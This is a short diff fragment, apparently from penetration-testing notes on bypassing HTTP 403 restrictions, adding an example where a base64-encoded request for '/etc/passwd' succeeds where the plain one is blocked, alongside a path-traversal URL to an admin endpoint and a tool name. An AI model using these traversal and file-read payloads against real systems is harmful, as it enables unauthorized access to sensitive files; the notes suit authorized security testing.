@@ -30,6 +30,13 @@ https://target/api/fakepath/..%2f/admin/fakepath/..%2f/users/123. <-- Try this
 ---
 
 
+url/?f=etc/passwd ==> 403
 
+url/?f=L2V0Yy9wYXNzd2Q= ==> 200
 
+---
+
+Tools
+
+403Jump
 
